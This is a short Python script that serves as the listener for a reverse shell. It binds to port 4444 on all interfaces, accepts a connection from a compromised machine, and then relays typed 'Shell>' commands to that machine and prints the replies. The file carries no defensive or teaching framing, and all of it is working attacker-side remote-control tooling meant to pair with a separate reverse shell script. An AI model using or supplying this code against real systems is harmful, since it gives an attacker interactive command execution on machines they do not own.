import socket

# Listener for reverse shell
def listener():
    host = "0.0.0.0"  # Listen on all available interfaces
    port = 4444  # The same port as in the reverse shell script

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print(f"[*] Listening on {host}:{port}")

    client_socket, client_address = s.accept()
    print(f"[*] Connection from {client_address}")

    while True:
        command = input("Shell> ")
        
        if command:
            client_socket.send(command.encode())

            if command.lower() == "exit":
                break

            response = client_socket.recv(1024).decode()
            print(response)

    client_socket.close()

# Start listener
if __name__ == "__main__":
    listener()
